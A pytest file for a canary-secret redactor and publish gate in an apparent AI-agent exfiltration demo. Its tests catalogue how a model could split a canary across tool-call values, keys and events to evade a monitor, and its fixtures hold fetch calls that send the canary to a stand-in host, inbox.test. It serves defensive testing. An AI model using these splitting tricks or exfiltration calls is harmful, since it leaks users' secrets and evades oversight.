def test_what_the_prefix_does_not_close():
    """The residual, held as a test so it cannot quietly become a claim of closure.

    The redactor is keyed on hashes, and the shape cannot be checked through a
    hash. So a caller that builds key material itself, rather than through
    `key_material`, can key a value that overlaps itself and still reaches the
    window guard -- and `--redact-sha256` on the proxy is the same door. The
    prefix removes every canary of the shape from that class, not the input.
    """
    value, hashes, lengths = overlapping_canary()   # never passed the intake
    assert value[0] == value[-1]
    with pytest.raises(k.CanaryWindowError):
        k.key_material(value)
    with pytest.raises(k.CanaryWindowError) as e:
        feed_all(value + value[1:] * 400, hashes, lengths)
    assert "above its bound" in str(e.value)


# --- the two span defences, each tested at its own level -------------------
# End to end these mask each other: merging makes the rewrite's backwards guard
# unreachable, and the guard makes an unmerged span list harmless. Mutation found
# that, so each is held here on its own rather than through the output they share.

def test_overlapping_match_spans_are_merged_and_touching_ones_are_not():
    """Strictly overlapping merges; touching does not. The second half is load-bearing.

    Merging a touching span made a run of back-to-back canaries one span of
    unbounded length, so `_drain` pinned its release to the run's start and the
    window guard fired at the shipped default. It also collapsed N occurrences
    into one placeholder. Both are held by the two tests below this one.
    """
    assert k._merge([(5, 15), (6, 10)]) == [(5, 15)], "a nested span was not absorbed"
    assert k._merge([(0, 6), (4, 8)]) == [(0, 8)], "two overlapping spans stayed apart"
    assert k._merge([(0, 4), (4, 8)]) == [(0, 4), (4, 8)], "two touching spans were merged"
    assert k._merge([(0, 4), (5, 9)]) == [(0, 4), (5, 9)], "disjoint spans were merged"
    assert k._merge([]) == []


def test_the_rewrite_cursor_never_moves_backwards():
    """Given unmerged nested spans, the rewrite must still not re-emit a canary's tail.

    Sorted nested spans put (5, 15) before (6, 10). An unguarded rewrite jumps
    its cursor to 10 and then back, publishing the five characters between 10 and
    15 in clear -- the enclosing canary's tail.
    """
    buf = "ABCDEFGHIJKLMNOPQRST"
    out = k.SplitCanaryRedactor._rewrite(buf, [(5, 15), (6, 10)], len(buf))
    assert out == "ABCDE" + k.CANARY + "PQRST", out
    assert buf[5:15] not in out
    assert buf[10:15] not in out, "the tail of the enclosing canary was re-emitted"


# --- the published shape, which needs no key material ----------------------
# The threat is recovery and not adjacency. A viewer with both halves on screen
# in any order recovers the canary by trying two concatenations and keeping the
# one that has the published shape, so a rule keyed on the shape closes the cases
# a rule keyed on document order cannot. Every test below asserts that the
# hash-keyed scans found nothing, so each one exhibits the shape rule rather than
# re-exhibiting a join.


def shape_only(errs) -> list[str]:
    """The errors that came from the shape rule. A hash-keyed error is not one."""
    return [e for e in errs if "shape" in e]


# The keyed fragment join added for pieces with text between them. It reaches
# most of the cases below as well, so it is set aside to show that the shape
# rule still catches each one on its own.
FRAGMENT_JOIN = "once the text between them is removed"


def caught_by_shape_alone(events, hashes, lengths, value) -> list[str]:
    errs = k.publish_errors(events, hashes, lengths)
    assert errs, "nothing found the canary at all"
    joins = [e for e in errs if FRAGMENT_JOIN not in e]
    assert shape_only(joins) == joins, f"a hash-keyed join caught this, so it proves nothing: {errs}"
    assert all(value[i:i + 8] not in e for e in errs for i in range(len(value) - 7))
    assert k.shape_errors(events), "the shape rule needs no key material and found nothing"
    return errs


def test_the_shape_rule_catches_halves_in_the_reverse_of_document_order():
    """The residual the ruling accepted, closed without permutations or key material."""
    value, hashes, lengths = new_canary()
    cut = len(value) // 2
    events = [event(0, "tool_call", {"tool": "fetch",
                                     "arguments": {"a": value[cut:], "b": value[:cut]}})]
    assert value not in chained(events)
    caught_by_shape_alone(events, hashes, lengths, value)


def test_the_shape_rule_catches_a_third_value_between_the_halves():
    value, hashes, lengths = new_canary()
    cut = len(value) // 2
    events = [event(0, "tool_call", {"tool": "fetch",
                                     "arguments": {"a": value[:cut], "b": "in between",
                                                   "c": value[cut:]}})]
    assert value not in chained(events)
    caught_by_shape_alone(events, hashes, lengths, value)


def test_the_shape_rule_catches_the_value_to_key_boundary():
    """Instance N+3: a key is a boundary too, and neither join reaches it.

    `_leaves` yields values only, so that a join restores value-to-value adjacency
    instead of interleaving keys between them. The cost was a canary with one half
    in a value and the other in the key that follows it, which is reachable by
    exactly the attacker the demo is about: a model names its own argument keys.
    """
    value, hashes, lengths = new_canary()
    cut = len(value) // 2
    shapes = (
        {"first": value[:cut], value[cut:]: "x"},            # value then the next key
        {value[:cut]: "x", "second": value[cut:]},            # key then the following value
    )
    for arguments in shapes:
        events = [event(0, "tool_call", {"tool": "fetch", "arguments": arguments}),
                  event(1, "run_finished", {"outcome": "exfiltrated"})]
        assert value not in chained(events), arguments
        caught_by_shape_alone(events, hashes, lengths, value)


def test_the_shape_rule_catches_a_half_in_one_events_value_and_the_next_events_key():
    value, hashes, lengths = new_canary()
    cut = len(value) // 2
    events = [event(0, "tool_call", {"tool": "fetch", "arguments": {"a": value[:cut]}}),
              event(1, "tool_call", {"tool": "fetch", "arguments": {value[cut:]: "x"}})]
    assert value not in chained(events)
    errs = caught_by_shape_alone(events, hashes, lengths, value)
    assert any("event(s) [0, 1]" in e for e in errs), errs


def test_the_shape_rule_catches_a_mis_declared_length():
    """The compensating control for limit 2 of section 7, without the hash.

    A caller who declares the wrong length loses the offset scan, so a canary
    embedded in a longer value is invisible to the hash-keyed rule. The shape rule
    never reads a length.
    """
    value, hashes, _ = new_canary()
    events = [event(0, "exfil_attempt", {"tool": "fetch",
                                         "url": f"http://inbox.test/?q={value}x",
                                         "canaryPresent": True})]
    wrong = (len(value) - 3,)
    assert not k._hit(events[0]["data"]["url"], hashes, wrong), "the hash rule caught it"
    caught_by_shape_alone(events, hashes, wrong, value)


def test_the_shape_rule_catches_a_canary_assembled_from_three_values():
    """Three pieces in three values, out of order, with the middle one a whole value."""
    value, hashes, lengths = new_canary()
    a, b, c = value[:15], value[15:30], value[30:]
    events = [event(0, "tool_call", {"tool": "fetch",
                                     "arguments": {"x": c, "y": b, "z": a}})]
    assert value not in chained(events)
    caught_by_shape_alone(events, hashes, lengths, value)


def test_the_shape_rule_catches_a_split_right_after_the_first_character_out_of_order():
    """The opener can be one character long, and the prefix makes that character special.

    `l` is the only place a canary of this shape can start, so a split right after
    it leaves an opener of exactly one character: a lone `l`, or any word ending in
    one. Out of document order no join reaches it, so only the shape rule does, and
    only if it accepts a one-character opener.
    """
    value, hashes, lengths = new_canary()
    for opener in (value[:1], "use the tool"):
        events = [event(0, "tool_call", {"tool": "fetch",
                                         "arguments": {"a": value[1:], "b": opener}})]
        assert value not in chained(events)
        caught_by_shape_alone(events, hashes, lengths, value)


def test_the_shape_assembly_passes_pieces_that_spell_one_character_short_of_the_shape():
    """A near miss stays clean, in either order and at every cut.

    Pieces that spell the shape minus its last hexadecimal digit are not a
    canary, so an assembly rule that accepted them would refuse takes that carry
    none. The same pieces with the digit put back are found, so the clean half is
    not clean because nothing could be found.

    Bare strings rather than C2 events, and the reason is the fixture, not the
    rule. Every event carries the envelope key `data`, and `d` is a hexadecimal
    digit, so inside an event a string opening on it supplies the missing last
    digit and the near miss becomes a real three-piece assembly.
    """
    value = k.make_canary()
    short = value[:-1]
    for cut in range(1, len(short)):
        for pieces in ([short[:cut], short[cut:]], [short[cut:], short[:cut]]):
            assert k._shape_assembly(pieces) is None, (cut, pieces[0] == short[:cut])
        assert k._shape_assembly([value[cut:], value[:cut]]) is not None, cut


def test_the_shape_rule_reports_nothing_on_a_stream_that_carries_no_shape():
    """A rule that fired on ordinary text would refuse every take.

    The negative control is a redacted stream plus the demo's own vocabulary, and
    a near miss: the shape's own prefix followed by fewer than PARTIAL_HEAD_MIN_HEX
    hexadecimal characters (below the head threshold, and far short of a tail's
    worth for the reach rule), and by characters that are not hexadecimal. A
    prefix followed by PARTIAL_HEAD_MIN_HEX or more digits is a canary head, which
    `test_a_literal_canary_head_in_model_output_is_refused` pins as a refusal, so
    the near miss stops one digit short of it.
    """
    value, hashes, lengths = new_canary()
    clean = k.redact_events(split_stream(value, 11), hashes, lengths)
    assert k.shape_errors(clean) == []
    near = [event(0, "model_delta", {"text": PREFIX + secrets.token_hex(16)[:k.PARTIAL_HEAD_MIN_HEX - 1]}),
            event(1, "model_delta", {"text": PREFIX + "z" * 32}),
            event(2, "beat", {"id": "b", "title": PREFIX, "caption": "x" * 32,
                              "minHoldSeconds": 1.0})]
    assert k.shape_errors(near) == []
    assert k.publish_errors(clean, hashes, lengths) == []


# --- the gate's own output, which was itself a leak ------------------------

def test_no_message_carries_a_canary_used_as_a_key():
    """A model names its own argument keys, so a key-derived path printed the canary.

    Measured before the fix: the refusal read `field data.arguments.<canary>
    (key)`. The fix is by construction rather than by case -- a path segment is
    printed only when the key is one of this module's own literals -- so a canary
    used as a key at any depth, and a canary key with a canary value, are all
    covered by the one rule.
    """
    value, hashes, lengths = new_canary()
    # Whether redaction covers the field is a separate question from whether the
    # message leaks. The first three sit inside `tool_call.arguments`, which is in
    # the redactor's scope, so redaction is asserted there too. The fourth is a key
    # at the data level, outside the whole-value convention's two named fields, and
    # the publish gate refusing is what fails that case closed.
    in_scope = (
        {"tool": "fetch", "arguments": {value: "send it"}},        # a key one level down
        {"tool": "fetch", "arguments": {value: value}},            # key and value both
        {"tool": "fetch", "arguments": [{value: ["x", value]}]},   # through a list
    )
    for data in in_scope + ({"tool": "fetch", value: {"inner": "x"}},):
        events = [event(0, "tool_call", data)]
        errs = k.publish_errors(events, hashes, lengths)
        assert errs, f"the canary as a key was not found at all: {sorted(data)!r}"
        for e in errs:
            assert all(value[i:i + 8] not in e for i in range(len(value) - 7)), e
            assert PREFIX not in e, e
    for data in in_scope:
        out = k.redact_events([event(0, "tool_call", data)], hashes, lengths)
        assert value not in json.dumps(out), out
    # A refusal carries no caller-supplied text either: passing the canary where
    # `lengths` belongs iterates it into characters, and the message names the type.
    with pytest.raises(k.CanaryWindowError) as e:
        k.SplitCanaryRedactor(hashes, tuple(value))
    assert "got str" in str(e.value)
    assert "'" not in str(e.value), "a refusal quoted a caller-supplied value"


# --- the two behaviours that were correct and unpinned ---------------------

def test_the_whole_value_hash_catches_a_canary_whose_declared_length_is_wrong():
    """`_hit` hashes the whole string as well as every fixed-width slice.

    Section 7's limit 2 names that fallback as the compensating control for a
    mis-declared length, and nothing pinned it. A value that is exactly the canary
    is still caught when the declared length is anything at all.
    """
    value, hashes, _ = new_canary()
    for wrong in ((10,), (len(value) - 1,), (len(value) + 1,), (1,)):
        assert k._hit(value, hashes, wrong), wrong
        assert k.redact_value(value, hashes, wrong) == k.CANARY, wrong
        assert k.redact_value({"url": value}, hashes, wrong) == {"url": k.CANARY}, wrong
    # The fallback is a whole-value rule and not an offset rule: an embedded canary
    # at a wrong length is the case the shape rule exists to catch.
    assert not k._hit(f"q={value}", hashes, (10,))


def test_two_model_delta_events_with_the_same_seq_are_refused():
    """Equal seq is not increasing seq. A duplicate from a collector bug is the trigger.

    Reassembly follows list order, so a stream whose order cannot be confirmed is
    refused rather than joined in a guessed order.
    """
    value, hashes, lengths = new_canary()
    events = [event(0, "model_delta", {"text": value[:9]}),
              event(0, "model_delta", {"text": value[9:]})]
    assert [ev["seq"] for ev in events] == [0, 0]
    with pytest.raises(k.CanaryWindowError) as e:
        k.redact_events(events, hashes, lengths)
    assert "increasing seq order" in str(e.value)
    assert any("increasing seq order" in err for err in k.publish_errors(events, hashes, lengths))


def test_the_shape_rule_needs_two_distinct_strings_and_counts_repeats():
    """One string whose own doubling spells the shape is not an assembly.

    Found by a surviving mutant of my own fix: dropping the requirement that the
    opening and closing pieces be different strings changed nothing any test
    noticed. The stream carries each string once, so a rule without that
    requirement refuses a take over a value that appears once, and a gate whose
    false positives are unbounded stops being consulted. Two separate values that
    happen to be equal are two pieces and are reported, which is why the
    requirement is by position rather than by text.
    """
    piece = secrets.token_hex(16) + PREFIX  # 32 hexadecimal characters, then the prefix
    alone = [event(0, "tool_call", {"tool": "fetch", "arguments": {"a": piece}})]
    assert k.shape_errors(alone) == [], k.shape_errors(alone)
    twice = [event(0, "tool_call", {"tool": "fetch",
                                    "arguments": {"a": piece, "b": piece}})]
    assert k.shape_errors(twice), "two values that each carry a piece do spell the shape"
    across = [event(0, "tool_call", {"tool": "fetch", "arguments": {"a": piece}}),
              event(1, "tool_call", {"tool": "fetch", "arguments": {"b": piece}})]
    assert k.shape_errors(across), "the same value in two events is two pieces"


def _virtual_head_beside_whole_canary(value: str) -> list[dict]:
    """A benign virtual head (`demo-` + the canary's first tail digit) in the model output,
    beside the whole canary carried once in the exfil url. The exfil url is redacted in place,
    so the published stream clears; the raw-event split scan must not rebuild the canary from the
    virtual head plus the exfil field's own digits."""
    tail = value[len(PREFIX):]
    return [
        event(0, "run_started", {"scenario": "rug-pull", "gate": "enforce", "synthetic": True,
                                 "demonstration": True}),
        event(1, "model_delta", {"text": f"opening the demo-{tail[0]} dashboard before the fetch"}),
        event(2, "exfil_attempt", {"tool": "fetch", "url": f"http://inbox.test/?q={value}",
                                   "canaryPresent": True}),
        event(3, "tool_call", {"tool": "fetch", "arguments": {"url": f"http://inbox.test/?q={value}"}}),
        event(4, "run_finished", {"outcome": "exfiltrated"}),
    ]


def _take_gate(events, hashes, lengths) -> list[str]:
    r = k.TakeRedactor(hashes, lengths)
    for ev in events:
        r.event(ev)
    r.finish()
    return r.publish_errors()


def test_a_whole_in_place_canary_beside_a_virtual_head_is_not_re_refused():
    """M-9 regression (J2 e2e gate): the raw-event split scan must not rebuild the whole-in-place
    canary from a virtual head and the exfil field's own digits. A virtual head is a `demo-`/`-`+hex
    fragment, which a benign J2 stream carries; seeding the keyed completion from one let the exfil
    fragment supply the tail through _hex_windows, so a fresh session canary was refused about one run
    in eight. Only a literal `lab-demo-` head may seed the completion. The whole canary here is redacted
    in place in the exfil url, so the take publishes."""
    value, hashes, lengths = new_canary()
    assert _take_gate(_virtual_head_beside_whole_canary(value), hashes, lengths) == []


def test_the_virtual_head_scenario_really_carries_the_canary_and_a_virtual_head():
    """The premise of the regression above, checked rather than assumed: the stream does carry the
    whole canary once, and the benign fragment is a virtual head that completes to the canary with the
    exfil field as its closer. If either stops holding, the test above proves nothing."""
    value, hashes, lengths = new_canary()
    events = _virtual_head_beside_whole_canary(value)
    strings = k._stream_strings(events, k._stream_order(events))
    assert any(value in s for s in strings), "the whole canary is not in the raw stream"
    frags = k._fragments(strings)
    virtual = [(f, k_, lit) for _, f in frags for head, k_, lit in k._fragment_heads(f) if not lit]
    assert virtual, "the benign fragment is not a virtual head, so the regression is not exercised"
